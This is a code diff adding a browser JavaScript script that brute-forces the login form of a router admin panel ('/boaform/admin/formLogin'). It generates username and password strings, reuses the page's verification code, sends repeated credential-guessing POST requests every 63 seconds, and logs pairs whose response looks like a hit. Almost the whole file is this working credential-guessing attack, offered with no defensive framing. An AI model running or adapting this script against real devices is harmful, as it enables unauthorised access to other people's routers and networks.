@@ -1,0 +1,86 @@
+class StringIdGenerator {
+  constructor(chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') {
+    this._chars = chars;
+    this._nextId = [0];
+  }
+
+  next() {
+    const r = [];
+    for (const char of this._nextId) {
+      r.unshift(this._chars[char]);
+    }
+    this._increment();
+    return r.join('');
+  }
+
+  _increment() {
+    for (let i = 0; i < this._nextId.length; i++) {
+      const val = ++this._nextId[i];
+      if (val >= this._chars.length) {
+        this._nextId[i] = 0;
+      } else {
+        return;
+      }
+    }
+    this._nextId.push(0);
+  }
+
+  *[Symbol.iterator]() {
+    while (true) {
+      yield this.next();
+    }
+  }
+}
+
+
+
+function req(u,p,v){
+var xhr = new XMLHttpRequest();
+xhr.open("POST", '/boaform/admin/formLogin', true);
+
+//Send the proper header information along with the request
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+xhr.onreadystatechange = function() { // Call a function when the state changes.
+    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+        var resp = xhr.response;
+        
+	if(resp.search("password") > -1){
+	console.log("Check This username " +u + " password " + p );
+	}
+    }
+}
+xhr.send("username1="+u+"&psd1="+p+"&verification_code="+v+"&username="+u+"&psd="+p+"&sec_lang=0&ismobile=");
+
+}
+const uname = new StringIdGenerator();
+
+ 
+const pass = new StringIdGenerator();
+while(uname.next().length < 5){
+uname.next();
+pass.next();
+}
+
+
+
+
+var vr = document.getElementById('check_code').value;
+
+req(uname.next(),pass.next(),vr)
+
+req(uname.next(),pass.next(),vr)
+
+req("","",vr);
+setInterval(()=>{
+
+
+var v = document.getElementById('check_code').value;
+
+req(uname.next(),pass.next(),v)
+
+req(uname.next(),pass.next(),v)
+
+req("","",v)
+},63*1000);
+
